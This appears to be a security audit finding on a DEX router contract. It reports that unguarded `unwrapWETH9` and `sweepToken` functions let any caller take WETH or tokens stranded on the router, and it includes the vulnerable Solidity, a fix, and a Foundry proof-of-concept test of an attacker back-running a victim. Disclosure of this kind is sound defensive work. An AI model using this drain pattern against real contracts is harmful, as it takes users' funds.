Audit Report

## Title
Unguarded `unwrapWETH9` and `sweepToken` Allow Any Caller to Drain Router-Held WETH/Tokens to Arbitrary Address — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`unwrapWETH9` is `public payable` with no access control and an attacker-controlled `recipient` parameter that unconditionally drains the router's entire WETH balance as native ETH to any address. The intended ETH-output pattern requires `recipient=router` as an intermediate step inside a `multicall`; any user who calls `exactInputSingle(recipient=router)` as a standalone transaction strands WETH on the router, which any third party can immediately claim via `unwrapWETH9(0, attacker)`. `sweepToken` carries the identical risk for any ERC-20 output.

## Finding Description
`unwrapWETH9` reads the full router WETH balance and forwards it to a caller-supplied address with no `msg.sender` check and no per-user accounting:

```solidity
// metric-periphery/contracts/base/PeripheryPayments.sol L37-45
function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(recipient, balanceWETH);   // arbitrary recipient, no guard
    }
}
```

The documented ETH-output pattern (confirmed in the test suite) is:

```
multicall([
  exactInputSingle(tokenOut=WETH, recipient=router),  // WETH lands on router
  unwrapWETH9(0, user)                                // user claims it
])
```

`multicall` uses `Address.functionDelegateCall` (MetricOmmSimpleRouter.sol L42), which preserves `msg.sender` but provides no isolation of balances between callers. A user who calls `exactInputSingle(tokenOut=WETH, recipient=router)` as a standalone transaction — a natural integration mistake given the interface accepts any `recipient` — leaves WETH stranded on the router between blocks. An attacker then calls `unwrapWETH9(0, attacker)` in the next transaction and receives the full balance. `sweepToken` (L48-55) is identically unguarded for any ERC-20.

## Impact Explanation
Direct loss of 100% of user swap output. A victim who calls `exactInputSingle(tokenOut=WETH, recipient=router)` outside a multicall loses their entire WETH output to any attacker who calls `unwrapWETH9(0, attacker)`. This is a Critical direct-loss-of-user-principal impact meeting Sherlock thresholds.

## Likelihood Explanation
`unwrapWETH9` requires no special role or condition — any EOA or contract can call it at any time. The ETH-output pattern explicitly requires `recipient=router` as an intermediate step, making the standalone-call mistake a realistic integration error. A mempool watcher or block-level bot can detect stranded WETH and back-run the victim's transaction with a single call. `sweepToken` creates the identical risk for any ERC-20 output routed through the router.

## Recommendation
Restrict `unwrapWETH9` and `sweepToken` so that ETH/tokens can only be sent to `msg.sender`, eliminating the attacker-controlled `recipient` parameter:

```solidity
function unwrapWETH9(uint256 amountMinimum) public payable {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(msg.sender, balanceWETH);
    }
}
```

This preserves the multicall pattern because `delegatecall` inside `multicall` keeps `msg.sender` as the original transaction sender throughout all steps.

## Proof of Concept
```solidity
function test_attacker_steals_victim_weth_via_unwrapWETH9() public {
    uint128 amountIn = 3_000;

    // tx1: victim swaps token -> WETH, mistakenly sets recipient=router (standalone, not multicall)
    vm.prank(victim);
    router.exactInputSingle(ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(token1),
        tokenOut: address(weth),
        zeroForOne: false,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: address(router),   // WETH stranded here
        deadline: block.timestamp + 1,
        priceLimitX64: type(uint128).max,
        extensionData: ""
    }));

    uint256 routerWeth = weth.balanceOf(address(router));
    assertGt(routerWeth, 0, "WETH stranded on router");

    // tx2: attacker drains it — no access control, arbitrary recipient
    uint256 attackerEthBefore = attacker.balance;
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);

    assertEq(weth.balanceOf(address(router)), 0, "router WETH drained");
    assertEq(attacker.balance - attackerEthBefore, routerWeth, "attacker received victim ETH");
}
```
